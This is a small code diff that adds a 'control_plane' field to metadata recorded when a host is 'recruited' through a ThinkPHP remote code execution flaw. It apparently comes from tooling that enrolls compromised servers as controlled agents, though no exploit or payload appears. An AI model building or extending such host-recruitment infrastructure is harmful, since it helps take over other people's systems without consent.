@@ -473,7 +473,7 @@ def _rce_enroll(ip: str) -> None:
                 agent_id=agent_id,
                 source_ip=ip,
                 payload_type="rce_session",
-                metadata_json={"recruited_via": "thinkphp_rce", "rce_proven": True},
+                metadata_json={"recruited_via": "thinkphp_rce", "rce_proven": True, "control_plane": "agent"},
             )
     except Exception:
         logger.exception("rce enroll failed for %s", ip)
